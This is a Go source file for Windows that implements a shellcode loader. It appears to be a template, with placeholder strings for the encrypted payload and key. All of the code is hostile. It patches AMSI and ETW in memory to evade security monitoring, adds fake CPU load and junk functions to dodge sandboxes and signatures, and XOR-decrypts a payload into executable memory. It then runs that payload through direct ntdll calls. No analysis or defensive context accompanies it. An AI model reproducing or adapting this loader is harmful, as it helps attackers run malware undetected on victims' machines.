//go:build windows && amd64

package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"syscall"
	"time"
	"unsafe"
	"golang.org/x/sys/windows"
)

var (
	modntdll                = syscall.NewLazyDLL("ntdll.dll")
	ntAllocateVirtualMemory = modntdll.NewProc("NtAllocateVirtualMemory")
	ntWriteVirtualMemory    = modntdll.NewProc("NtWriteVirtualMemory")
	ntCreateThreadEx        = modntdll.NewProc("NtCreateThreadEx")
	ntProtectVirtualMemory  = modntdll.NewProc("NtProtectVirtualMemory")
	ntWaitForSingleObject   = modntdll.NewProc("NtWaitForSingleObject")
)

var (
	encryptedShellcode = "§shellcode§"
	encryptionKey      = "§key§"
)

func xorDecode(data, key []byte) []byte {
	res := make([]byte, len(data))
	for i := range data {
		res[i] = data[i] ^ key[i%len(key)]
	}
	return res
}

func patchMemory(addr uintptr, patch []byte) error {
	var oldProtect uint32
	size := uintptr(len(patch))
	r1, _, _ := ntProtectVirtualMemory.Call(
		uintptr(^uintptr(0)),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed")
	}
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = patch[i]
	}
	return nil
}

func unhookAMSIandETW() {
	amsi, _ := syscall.LoadLibrary("amsi.dll")
	addr, _ := syscall.GetProcAddress(syscall.Handle(amsi), "AmsiScanBuffer")
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax,eax; ret
	_ = patchMemory(uintptr(addr), patch)

	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	etw, _ := syscall.GetProcAddress(syscall.Handle(ntdll), "EtwEventWrite")
	etwPatch := []byte{0xC3} // ret
	_ = patchMemory(uintptr(etw), etwPatch)
}

// Sleep Obfuscation: fake CPU/RAM load
func simulateFakeLoad(duration time.Duration) {
	end := time.Now().Add(duration)
	rand.Seed(time.Now().UnixNano())
	var sink int
	for time.Now().Before(end) {
		for i := 0; i < 1000; i++ {
			sink += rand.Intn(1000) * rand.Intn(1000)
		}
	}
}

// Code Randomization: no-op functions
func junkFuncA() int {
	return 42 * rand.Intn(3)
}

func junkFuncB(x int) int {
	return x ^ rand.Intn(100)
}

func junkFuncC() string {
	arr := []string{"foo", "bar", "baz"}
	return arr[rand.Intn(len(arr))]
}

func main() {
	unhookAMSIandETW()

	simulateFakeLoad(5 * time.Second)
	_ = junkFuncA()
	_ = junkFuncB(123)
	_ = junkFuncC()

	shellEnc, _ := base64.StdEncoding.DecodeString(encryptedShellcode)
	key, _ := base64.StdEncoding.DecodeString(encryptionKey)
	shellcode := xorDecode(shellEnc, key)

	var baseAddr uintptr = 0
	size := uintptr(len(shellcode))
	procHandle := uintptr(^uintptr(0))

	r1, _, _ := ntAllocateVirtualMemory.Call(procHandle, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&size)), 0x3000, 0x40)
	if r1 != 0 {
		fmt.Println("[-] Memory allocation failed")
		return
	}

	r2, _, _ := ntWriteVirtualMemory.Call(procHandle, baseAddr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if r2 != 0 {
		fmt.Println("[-] Writing shellcode failed")
		return
	}

	var threadHandle uintptr
	r3, _, _ := ntCreateThreadEx.Call(uintptr(unsafe.Pointer(&threadHandle)), 0x1FFFFF, 0, procHandle, baseAddr, 0, 0, 0, 0, 0, 0)
	if r3 != 0 {
		fmt.Println("[-] Thread creation failed")
		return
	}

	ntWaitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
}
